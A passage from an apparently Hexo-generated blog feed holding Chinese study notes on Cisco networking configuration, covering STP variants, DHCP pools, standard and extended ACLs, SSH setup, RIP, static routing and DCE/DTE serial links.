title="路由协议度量"></a>路由协议度量</h2><ul><li><p><strong>路由信息协议 (RIP)</strong> - 跳数</p></li><li><p><strong>开放最短路径优先 (OSPF)</strong> - 根据源到目的地的累积带宽计算出的思科成本</p></li><li><p><strong>增强型内部网关路由协议 (EIGRP)</strong> – 最小带宽、延迟、负载和可靠性。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络设备配置 </category>
          
          <category> Cisco </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>STP及变体</title>
      <link href="/Internet-equipment/Cisco/STP.html"/>
      <url>/Internet-equipment/Cisco/STP.html</url>
      
        <content type="html"><![CDATA[<blockquote><p> 当在交换网络中提供物理冗余时, 为了防止二层交换网络形成环路, 造成广播风暴等严重后果, 于是有了生成树等协议</p><p>对于生成树更好的理解, 我推荐<a href="https://www.zhihu.com/answer/109458339">这篇文章</a></p></blockquote><span id="more"></span><h1 id="STP"><a href="#STP" class="headerlink" title="STP"></a>STP</h1><h2 id="BPDU"><a href="#BPDU" class="headerlink" title="BPDU"></a>BPDU</h2><p>是所有参与STP交换机的交流信息帧, 里面就有BID</p><h2 id="BID"><a href="#BID" class="headerlink" title="BID"></a>BID</h2><p>包含 <strong>优先级值(16个值, 默认32768, 步进4096)</strong>, <strong>源MAC</strong>, <strong>扩展系统ID(STP是VLAN_id)</strong>.</p><blockquote><p><code>show spanning-tree active</code>时, 优先级=优先级值+VLAN_id</p><p>优先级可手动指定</p><p><code>spanning-tree vlan vlan_id priority</code></p></blockquote><h2 id="ROOT-Bridge"><a href="#ROOT-Bridge" class="headerlink" title="ROOT Bridge"></a>ROOT Bridge</h2><ul><li>BID最小的为根网桥</li><li>每个生成树实例（交换 LAN 或广播域）都有一台交换机指定为根网桥</li><li>为生成树实例选择根网桥后，STA 便开始确定从广播域内所有目的地到根网桥的最佳路径</li></ul><blockquote><p>相同优先级, MAC最小的是根网桥</p></blockquote><h2 id="端口角色"><a href="#端口角色" class="headerlink" title="端口角色"></a>端口角色</h2><h3 id="根端口"><a href="#根端口" class="headerlink" title="根端口"></a>根端口</h3><p>根端口靠近根网桥, 非根网桥只能有一个根端口</p><h3 id="指定端口"><a href="#指定端口" class="headerlink" title="指定端口"></a>指定端口</h3><p>允许转发流量, 在某个网段里开销最小的端口为指定端口</p><h3 id="非指定端口"><a href="#非指定端口" class="headerlink" title="非指定端口"></a>非指定端口</h3><p>不允许转发流量, 在某个网段里开销最大的端口为非指定端口</p><blockquote><p>RSTP(快速STP), 定义了代替端口 备用端口 禁用端口</p></blockquote><h2 id="根路径开销"><a href="#根路径开销" class="headerlink" title="根路径开销"></a>根路径开销</h2><p>STA默认通过网速确认开销, 也可通过 <code>spanning-tree vlan vlan_id cost cost_value</code>手动修改(思科交换机默认的协议是 <code>pvst+</code> )</p><p>开销值决定了哪个接口处于转发(小的就转发)</p><h1 id="PVST"><a href="#PVST" class="headerlink" title="PVST+"></a>PVST+</h1><h2 id="端口状态"><a href="#端口状态" class="headerlink" title="端口状态"></a>端口状态</h2><p><strong>阻塞</strong> - 该端口是替代端口，不参与帧转发。</p><p><strong>侦听</strong> - 侦听到根网桥的路径</p><p><strong>学习</strong> - 学习 MAC 地址</p><p><strong>转发</strong> - 该端口是活动拓扑的一部分</p><p><strong>禁用</strong> － 该第 2 层端口不参与生成树，不会转发帧。</p><blockquote><p>使用 <strong>show spanning-tree summary</strong> 命令可以显示各种状态（阻塞、侦听、学习或转发）下的端口数量。</p></blockquote><h2 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h2><p>与上面的STP不同, PVST+允许每个VLAN有一个STP实例</p><p>也就是说, 交换机上的一个中继端口可以阻止某个 VLAN, 同时转发其他 VLAN</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">spanning<span class="literal">-tree</span> vlan vlan_id root &#123;primary|secondary&#125;</span><br><span class="line"><span class="comment"># vlan_id可以有两种写法[1,2,3..|1-99]</span></span><br></pre></td></tr></table></figure><h2 id="portfast"><a href="#portfast" class="headerlink" title="portfast"></a>portfast</h2><p>将交换机的某个端口直接设置为转发状态</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入某接口</span></span><br><span class="line">spanning<span class="literal">-tree</span> portfast </span><br><span class="line"><span class="comment"># 全局配置模式设置非TRUNK接口为portfast</span></span><br><span class="line">spanning<span class="literal">-tree</span> portfast default </span><br></pre></td></tr></table></figure><h2 id="BPDUGUARD"><a href="#BPDUGUARD" class="headerlink" title="BPDUGUARD"></a>BPDUGUARD</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入某接口</span></span><br><span class="line">spanning<span class="literal">-tree</span> bpdduguard enable</span><br><span class="line"><span class="comment"># 全局配置模式设置非TRUNK接口为portfast</span></span><br><span class="line">spanning<span class="literal">-tree</span> portfast bpduguard default</span><br></pre></td></tr></table></figure><h1 id="快速PVST"><a href="#快速PVST" class="headerlink" title="快速PVST+"></a>快速PVST+</h1><blockquote><p>快速PVST+可以将RSTP应用到每个VLAN</p><p>RSTP相对与STP有更快的收敛速度</p><p>PSTP定义了新的端口状态, 如果端口被配置为替代端口或备用端口, 则该端口可以立即转换到转发状态, 而无需等待网络收敛</p></blockquote><h2 id="边缘端口"><a href="#边缘端口" class="headerlink" title="边缘端口"></a>边缘端口</h2><ul><li>RSTP 边缘端口概念对应 PVST+ PortFast 功能</li><li>RSTP 边缘端口应立即转换到转发状态，从而跳过原始 802.1D 中耗时的侦听和学习端口状态</li><li><code>spanning-tree portfast</code> 命令来执行边缘端口配置</li></ul><blockquote><p>建议不要将边缘端口配置为连接其他交换机</p><p>边缘端口一般与用户终端设备连接</p></blockquote><h2 id="链路类型"><a href="#链路类型" class="headerlink" title="链路类型"></a>链路类型</h2><ul><li><p><strong>点对点</strong> - 在全双工模式下运行的端口通常将交换机连接到交换机，并且是快速转换到转发状态的候选端口。</p></li><li><p><strong>共享</strong> - 在半双工模式下运行的端口将交换机连接到连接各种设备的集线器。</p></li></ul><p>一般都是自动确定, 也可手动选择</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spanning<span class="literal">-tree</span> link<span class="literal">-type</span> &#123; point<span class="literal">-to</span><span class="literal">-point</span> | shared &#125;</span><br></pre></td></tr></table></figure><h2 id="负载均衡-1"><a href="#负载均衡-1" class="headerlink" title="负载均衡"></a>负载均衡</h2><p>同样支持负载均衡, 与PVST+语法相同</p>]]></content>
      
      
      <categories>
          
          <category> 网络设备配置 </category>
          
          <category> Cisco </category>
          
      </categories>
      
      
        <tags>
            
            <tag> STP </tag>
            
            <tag> RSTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DHCP</title>
      <link href="/Internet-equipment/Cisco/DHCP.html"/>
      <url>/Internet-equipment/Cisco/DHCP.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>分配IP的方式有两种: </p><p>一是静态手动分配</p><p>二是动态DHCP分配</p></blockquote><span id="more"></span><p>原理已经计算机自顶向下中得知, 不在多说, 直接开始配置</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 排除 IPv4 地址</span></span><br><span class="line">ip dhcp excluded<span class="literal">-address</span> low_address [<span class="type">height_address</span>]</span><br><span class="line"><span class="comment"># 配置地址池</span></span><br><span class="line">ip dhcp pool pool_name</span><br><span class="line"><span class="comment"># 进入配置地址池后,</span></span><br><span class="line"><span class="comment"># 定义地址池(必选)</span></span><br><span class="line">network network_ip [<span class="type">mask</span>|/<span class="type">prefix</span>-<span class="type">length</span>]</span><br><span class="line"><span class="comment"># 定义默认路由(必选)</span></span><br><span class="line">default<span class="literal">-route</span> address <span class="comment">#可以有多个</span></span><br><span class="line"><span class="comment"># [定义DNS服务器]</span></span><br><span class="line">dns<span class="literal">-server</span> address <span class="comment">#可以有多个</span></span><br><span class="line"><span class="comment"># [定义域名]</span></span><br><span class="line">domain<span class="literal">-name</span> domain</span><br><span class="line"><span class="comment"># [租约]</span></span><br><span class="line">lease &#123;days [<span class="type">hours</span>] [<span class="type">minites</span>] | infinite&#125;</span><br><span class="line"><span class="comment"># 禁用dhcp, 在config模式下</span></span><br><span class="line">no service dhcp</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络设备配置 </category>
          
          <category> Cisco </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DHCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACL</title>
      <link href="/Internet-equipment/Cisco/ACL.html"/>
      <url>/Internet-equipment/Cisco/ACL.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>ACL(访问控制列表) 是一系列被称为访问控制条目 (ACE) 的 permit 或 deny 语句组成的顺序列表。ACE 通常也称为 ACL 语句</p><p>ACE有严格的顺序要求</p><p>ACL可以用于普通接口, 也可以用于vty</p></blockquote><span id="more"></span><h2 id="标准ACL"><a href="#标准ACL" class="headerlink" title="标准ACL"></a>标准ACL</h2><ul><li><p>基于<strong>源IP地址</strong>过滤数据包</p></li><li><p>标准访问控制列表的访问控制列表号是<strong>1~99</strong></p></li></ul><h3 id="创建ACL"><a href="#创建ACL" class="headerlink" title="创建ACL"></a>创建ACL</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># config</span></span><br><span class="line">Router(config):access<span class="literal">-list</span> access<span class="literal">-list</span><span class="literal">-number</span> &#123;permit | deny&#125; source [<span class="type">source</span>-<span class="type">wildcard</span>]</span><br><span class="line"><span class="comment"># wildcard(通配符) 采用子网掩码反码形式</span></span><br></pre></td></tr></table></figure><h3 id="使用ACL"><a href="#使用ACL" class="headerlink" title="使用ACL"></a>使用ACL</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 接口模式下</span></span><br><span class="line">ip access<span class="literal">-group</span> list_id <span class="keyword">in</span>/out</span><br><span class="line"><span class="comment"># 在vty模式下</span></span><br><span class="line">access<span class="literal">-class</span> list_id <span class="keyword">in</span>/out</span><br></pre></td></tr></table></figure><h3 id="查看ACL"><a href="#查看ACL" class="headerlink" title="查看ACL"></a>查看ACL</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建的</span></span><br><span class="line">show access<span class="literal">-lists</span></span><br><span class="line"><span class="comment"># 启用的</span></span><br><span class="line">show running<span class="literal">-config</span> </span><br></pre></td></tr></table></figure><blockquote><p> 由于标准 ACL 不会指定目标地址，所以其位置应该尽可能靠近目标。在流量源附近设置标准 ACL 可以有效阻止流量通过应用了 ACL 的接口到达任何其他网络</p></blockquote><h2 id="扩展ACL"><a href="#扩展ACL" class="headerlink" title="扩展ACL"></a>扩展ACL</h2><ul><li>基于<strong>源IP地址、目的IP地址、指定协议、端口</strong>来过滤数据包</li><li>扩展访问控制列表的访问控制列表号是<strong>100~199</strong></li></ul><h3 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">access<span class="literal">-list</span> <span class="number">100</span><span class="literal">-199</span></span><br><span class="line">&#123;permit|deny|remark&#125; protocol_type</span><br><span class="line">[<span class="type">host</span>] source_ip [<span class="type">wildcard</span>] &#123;lt|gt|eq..&#125; &#123;server_name|port&#125;</span><br><span class="line">[<span class="type">host</span>] destnation_ip [<span class="type">wildcard</span>] &#123;lt|gt|eq..&#125; &#123;server_name|port&#125;</span><br><span class="line">[<span class="type">dscp</span>|<span class="type">established</span>|<span class="type">precedence</span>]</span><br></pre></td></tr></table></figure><blockquote><p>将扩展 ACL 放置在尽可能靠近需要过滤的流量源的位置上。这样，不需要的流量会在靠近源网络的位置遭到拒绝，而无需通过网络基础设施</p><p>放置原则可以简单理解为:  </p><ul><li>扩展匹配细致, 所以放在源</li><li>标准匹配广泛, 所以放在目标</li></ul></blockquote><h2 id="命名ACL"><a href="#命名ACL" class="headerlink" title="命名ACL"></a>命名ACL</h2><blockquote><p>命名访问控制列表允许在标准和扩展访问控制列表中使用名称代替表</p><p>优点就是可以单独的增删语句, 且自定义顺序</p></blockquote><h3 id="创建-1"><a href="#创建-1" class="headerlink" title="创建"></a>创建</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建一个命名ACL表</span></span><br><span class="line">ip access<span class="literal">-list</span> &#123;standard|extended&#125; &#123;name|<span class="number">1</span><span class="literal">-99</span>|<span class="number">100</span><span class="literal">-199</span>&#125;</span><br><span class="line"><span class="comment"># 在表内写语句, 序号默认10,20...</span></span><br><span class="line">[<span class="number">1</span>-<span class="number">2147483647</span>] &#123;permit|deny&#125;....</span><br></pre></td></tr></table></figure><ul><li>不需要哪条语句时进命名ACL表no掉就好</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络设备配置 </category>
          
          <category> Cisco </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>小知识</title>
      <link href="/Internet-equipment/DCN/CS6200-28X-EI/Other.html"/>
      <url>/Internet-equipment/DCN/CS6200-28X-EI/Other.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>VLSM CIDR picocom </p></blockquote><span id="more"></span><h2 id="VLSM-amp-CIDR"><a href="#VLSM-amp-CIDR" class="headerlink" title="VLSM&amp;CIDR"></a>VLSM&amp;CIDR</h2><p>如果说vlsm是将子网掩码细分, 那CIDR就是将子网掩码汇总</p><p>用来规划网络</p><h2 id="串口工具"><a href="#串口工具" class="headerlink" title="串口工具"></a>串口工具</h2><p><code>sudo pacman -S picocom</code></p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p><code>sudo picocom -b 波特率 device</code></p><p><code>ctrl-a</code> 进入转义模式</p><p><code>ctrl-h</code> 帮助</p>]]></content>
      
      
      <categories>
          
          <category> 网络设备配置 </category>
          
          <category> 神州 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技能大赛-信息安全 </tag>
            
            <tag> CS6200-28X-EI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSH</title>
      <link href="/Internet-equipment/Cisco/SSH.html"/>
      <url>/Internet-equipment/Cisco/SSH.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>安全外壳 (SSH) 是一种提供远程设备的安全（加密）管理连接的协议</p></blockquote><span id="more"></span><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><ol><li>使用 <code>show ssh</code> 查看当前系统是否支持SSH</li><li>使用 <code>ip domain-name (dname)</code>设置域名</li><li>生成RSA秘钥对</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> config</span></span><br><span class="line">ip ssh version 2</span><br><span class="line">crypto key generate rsa # 长度</span><br><span class="line">crypto key zeroize rsa # 删除RSA, ssh会自动禁用</span><br></pre></td></tr></table></figure><ol start="4"><li>配置用户+密码</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username username secret password</span><br></pre></td></tr></table></figure><ol start="5"><li>配置vty线路</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> config</span></span><br><span class="line">line vty 0-15 # 配置所有线路</span><br><span class="line">transport input ssh # 使用ssh</span><br><span class="line">login local # 使用本地数据库(提供用户名+密码)</span><br></pre></td></tr></table></figure><h2 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh [-p port] username@host</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络设备配置 </category>
          
          <category> Cisco </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>配置RIP</title>
      <link href="/Internet-equipment/Cisco/RIP.html"/>
      <url>/Internet-equipment/Cisco/RIP.html</url>
      
        <content type="html"><![CDATA[<blockquote><p> <strong>路由信息协议</strong>（英语：<strong>R</strong>outing <strong>I</strong>nformation <strong>P</strong>rotocol，缩写：<strong>RIP</strong>）是一种<a href="https://zh.wikipedia.org/wiki/内部网关协议">内部网关协议</a>（IGP），为最早出现的<a href="https://zh.wikipedia.org/wiki/距離向量路由協定">距离向量路由协议</a>。属于<a href="https://zh.wikipedia.org/wiki/網絡層">网络层</a>，其主要应用于规模较小的、可靠性要求较低的网络，可以通过不断的交换信息让<a href="https://zh.wikipedia.org/wiki/路由器">路由器</a>动态的适应网络连接的变化，这些信息包括每个路由器可以到达哪些网络，这些网络有多远等。</p><p> 虽然RIP仍然经常的被使用，但是由于收敛慢和支持的广播网络规模有限等缺点，许多人认为它将会而且正在被诸如<a href="https://zh.wikipedia.org/wiki/OSPF">OSPF</a>和<a href="https://zh.wikipedia.org/wiki/IS-IS">IS-IS</a>这样的路由协议所取代。当然，我们也看到<a href="https://zh.wikipedia.org/wiki/EIGRP">EIGRP</a>，一种和RIP属于同一基本协议类但更具适应性的路由协议，也有被使用。</p></blockquote><span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p><strong>RIP</strong>每隔30秒会与相邻的路由器交换子消息，以动态的创建<a href="https://zh.wikipedia.org/wiki/路由表">路由表</a>。</p><p><strong>RIPv1</strong>使用<a href="https://zh.wikipedia.org/wiki/分类网络">分类路由</a>，没有携带掩码信息, 不支持<strong>CIDR</strong>, 不支持验证</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">router rip # 配置RIP(v1)</span><br><span class="line">no router rip # 禁用RIP</span><br><span class="line">version 2 # 启用v2</span><br><span class="line">show ip protocols # 显示ipv4路由协议(包括RIP)</span><br></pre></td></tr></table></figure><h2 id="通告网络"><a href="#通告网络" class="headerlink" title="通告网络"></a>通告网络</h2><p>进入RIP配置模式后, 设置需要通告的网络</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">Router(config-router)#</span><span class="bash">network network_ip</span></span><br></pre></td></tr></table></figure><blockquote><p>如果使用RIPv1, network_ip会自动汇总为有类网络地址</p></blockquote><h2 id="禁用自动汇总"><a href="#禁用自动汇总" class="headerlink" title="禁用自动汇总"></a>禁用自动汇总</h2><p><strong>启用RIPv2后</strong>, 默认是启用自动汇总的, 在RIP配置模式下, 使用下面指令禁用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no auto-summary </span><br></pre></td></tr></table></figure><h2 id="配置被动接口"><a href="#配置被动接口" class="headerlink" title="配置被动接口"></a>配置被动接口</h2><blockquote><p>默认情况下，将 RIP 更新从所有启用 RIP 的接口发出。但是，RIP 更新实际上仅需要从连接到其他启用 RIP 路由器的接口发出</p></blockquote><p>在RIP配置模式下, 使用 <strong><code>passive-interface</code></strong> 路由器配置命令阻止通过路由器接口传输路由更新, 也就是将该接口配置成被动接口</p><blockquote><p>所有路由协议都支持 <strong><code>passive-interface</code></strong> 命令。</p></blockquote><h2 id="传播默认路由"><a href="#传播默认路由" class="headerlink" title="传播默认路由"></a>传播默认路由</h2><p>首先在边缘路由器上配置RIP, 然后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> config</span></span><br><span class="line">ip route 0.0.0.0 0.0.0.0 &lt;gw&gt;</span><br><span class="line"><span class="meta">#</span><span class="bash"> RIP配置模式下</span></span><br><span class="line">default-information originate </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络设备配置 </category>
          
          <category> Cisco </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RIP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路由相关知识</title>
      <link href="/Internet-equipment/Cisco/about-route.html"/>
      <url>/Internet-equipment/Cisco/about-route.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><strong>当两个不同得网段需要通信时, 就会需要路由器</strong>.</p><p>路由到其他网络的方法又分为<strong>静态</strong>和<strong>动态</strong>, 一个路由器上也可以存在两种配置</p><ul><li>动态需要占用额外的带宽, 存在一定安全隐患, 但易维护</li><li>静态适合小型网络</li><li>当静态和动态冲突时, 会选择两者之中<strong>管理距离</strong>最小(AD)的转发</li></ul></blockquote><span id="more"></span><h2 id="静态路由"><a href="#静态路由" class="headerlink" title="静态路由"></a>静态路由</h2><blockquote><p>配置: <code>ip route</code></p><p>查看: </p><ul><li><p><code>show ip route</code></p></li><li><p><code>show ip route static</code></p></li><li><p><code>show ip route 网络</code></p></li></ul><p><strong>IPv6</strong>必须在全局配置<code>ipv6 unicast-routing</code>命令。</p><p>将上面的ip换成ipv6即可配置和查看</p></blockquote><h3 id="默认静态路由"><a href="#默认静态路由" class="headerlink" title="默认静态路由"></a>默认静态路由</h3><blockquote><p>如果一台路由器仅有另外一台路由器与之相连，在这种情况下，路由器称为末节路由器。</p><p>末节路由器和边缘路由器通常采用默认静态路由</p></blockquote><ul><li>默认静态路由仅是 0.0.0.0/0 作为目标 IPv4 地址的静态路由。</li></ul><blockquote><p>IPv6是 <code>::/0</code></p></blockquote><h3 id="汇总静态路由"><a href="#汇总静态路由" class="headerlink" title="汇总静态路由"></a>汇总静态路由</h3><ul><li>对于多条连续的网络条目, 可以将其汇总成一条减少路由条目数量</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">172.20.0.0/16</span><br><span class="line">172.21.0.0/16</span><br><span class="line">172.22.0.0/16</span><br><span class="line">172.23.0.0/16</span><br><span class="line">|</span><br><span class="line">v</span><br><span class="line">172.20.0.0/14</span><br></pre></td></tr></table></figure><h3 id="浮动静态路由"><a href="#浮动静态路由" class="headerlink" title="浮动静态路由"></a>浮动静态路由</h3><p>相当于备用路由, 管理距离要比静态/动态的大</p><h3 id="跳选项"><a href="#跳选项" class="headerlink" title="跳选项"></a>跳选项</h3><blockquote><p><strong>CEF</strong>（思科快速转发）是运行 <strong>IOS 12.0</strong> 或更高版本的大多数平台的默认行为</p><p>使用 CEF 时不需要完全指定静态路由。应采用使用下一跳地址的静态路由。</p></blockquote><p>路由分为以下三种类型：</p><p><strong>下一跳路由</strong> - 仅指定下一跳 IP 地址</p><ul><li>指定后不可避免的就是递归查找(耗费资源)</li><li>IOS 12.0使用了CEF, 避免了递归查找</li></ul><p><strong>直连静态路由</strong> - 仅指定路由器退出接口</p><p><strong>完全指定静态路由</strong> - 指定下一跳 IP 地址和退出接口</p><ul><li>早期IOS规避递归查找的办法</li></ul><h2 id="动态路由"><a href="#动态路由" class="headerlink" title="动态路由"></a>动态路由</h2><blockquote><p>动态路由协议自上个世纪八十年代后期开始应用于网络。RIP 是第一批路由协议中的一个.</p><p>RIP 协议更新为 RIPv2 以适应网络环境的发展。 但是，RIPv2 仍无法扩展以适应当今的大型网络实施。 为了满足大型网络的需要，两种高级路由协议应运而生：开放最短路径优先协议 (OSPF) 和中间系统到中间系统协议 (IS-IS)。思科也推出了面向大型网络实施的“内部网关路由协议”(IGRP) 和增强型 IGRP (EIGRP) 协议</p><p>此外，需要连接不同的网际网络并在它们之间提供路由。边界网关协议 (BGP) 当前用于互联网服务提供商 (ISPs) 之间。 BGP 还用于 ISP 与其较大的私有客户端之间来交换路由信息。</p></blockquote><p>动态路由协议的主要组件包括：</p><ul><li><strong>数据结构</strong> - 路由协议通常使用路由表或数据库来完成路由过程。此类信息保存在内存中。</li><li><strong>路由协议消息</strong> - 路由协议使用各种消息找出邻近的路由器，交换路由信息，并通过其他一些任务来获取和维护准确的网络信息。</li><li><strong>算法</strong> - 算法是指用于完成某个任务的一定数量的步骤。路由协议使用算法获取路由信息并确定最佳路径。</li></ul><h2 id="路由条目"><a href="#路由条目" class="headerlink" title="路由条目"></a>路由条目</h2><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2021/route-item.png" alt=""></p><blockquote><p>优先选择最长的子网掩码的路由，如果有多条路由，则匹配管理距离，管理距离小的路由优先，如果管理距离相同，在匹配度量值，度量值小的优先，如果度量值相同，则选择负载均衡，具体的方式看采用哪种路由协议和相关的配置了。</p></blockquote><h3 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h3><ul><li><p><strong>最终路由</strong> - 最终路由是包含下一跳 IPv4 地址或送出接口的路由表条目。动态获知的直连本地路由为最终路由</p></li><li><p><strong>一级路由</strong> - 1 级路由是指子网掩码等于或小于网络地址有类掩码的路由. 比如</p><ul><li><p><strong>网络路由</strong> - 是指子网掩码等于有类掩码的路由。</p></li><li><p><strong>超网路由</strong> - 是指掩码小于有类掩码（例如，汇总地址）的网络地址。</p></li><li><p><strong>默认路由</strong> - 是指地址为 0.0.0.0/0 的静态路由。</p></li><li><p>一级路由可以是最终路由</p></li></ul></li><li><p><strong>一级父路由</strong> - 父路由是划分子网的 1 级网络路由。父路由不可以是最终路由</p></li><li><p><strong>二级子路由</strong> - 2 级子路由是指有类网络地址的子网路由</p></li></ul><h2 id="单臂路由"><a href="#单臂路由" class="headerlink" title="单臂路由"></a>单臂路由</h2><ul><li>与路由器连接的交换机需要开启trunk<ul><li>路由器使用 <code>intface g0/1[.id]</code>创建子接口</li></ul></li><li>给子接口分配 <strong>ip</strong></li><li><strong>encapsulation dot1q</strong> <em>vlan_id</em> </li><li>开启父接口</li></ul><blockquote><p>路由器查看指令:</p><p><code>show vlan</code></p><p><code>show ip route</code></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络设备配置 </category>
          
          <category> Cisco </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DCE和DTE的区别</title>
      <link href="/Internet-equipment/Cisco/DCE-DTE.html"/>
      <url>/Internet-equipment/Cisco/DCE-DTE.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://en.wikipedia.org/wiki/Data_circuit-terminating_equipment#cite_note-TIA_1997_232F-1"><strong>data circuit-terminating equipment</strong></a> (<strong>DCE</strong>) </p><p>DCE是数据通信设备，如MODEM，连接DTE设备的通信设备。(一般广域网常用 <a href="http://baike.baidu.com/view/536354.htm">DCE设备</a> 有：CSU/DSU，广域网 <a href="http://baike.baidu.com/view/1077.htm">交换机</a> ，MODEM)</p><p>DTE设备是<a href="https://en.wikipedia.org/wiki/Terminal_(telecommunication)">终端</a>（或<a href="https://en.wikipedia.org/wiki/Computer">计算机</a>）</p></blockquote><span id="more"></span><p>DTE和DCE只是针对串行端口的，路由器通常通过串行端口连接广域网络(串口便宜)</p><ul><li>DTE是针头（俗称 <a href="http://baike.baidu.com/view/2944899.htm">公头</a> ），DCE是孔头（俗称 <a href="http://baike.baidu.com/view/3572688.htm">母头</a> ）</li><li>DTE,DCE的之间的区别是DCE一方提供时钟，DTE不提供时钟，但它依靠DCE提供的时钟工作</li><li>DCE,它在DTE和传输线路之间提供信号变换和编码功能，并负责建立、保持和释放链路的连接</li></ul><blockquote><p>参考文章</p><p><a href="https://blog.csdn.net/wangyunqian6/article/details/6371130?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EOPENSEARCH%7Edefault-3.control&dist_request_id=1330147.22499.16181241610311079&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EOPENSEARCH%7Edefault-3.control">DTE和DCE详解</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络设备配置 </category>
          
          <category> Cisco </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DCE </tag>
            
            <tag> DTE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unzip乱码</title>
      <link href="/TechnicalExperience/Linux/unzip-Garbled.html"/>
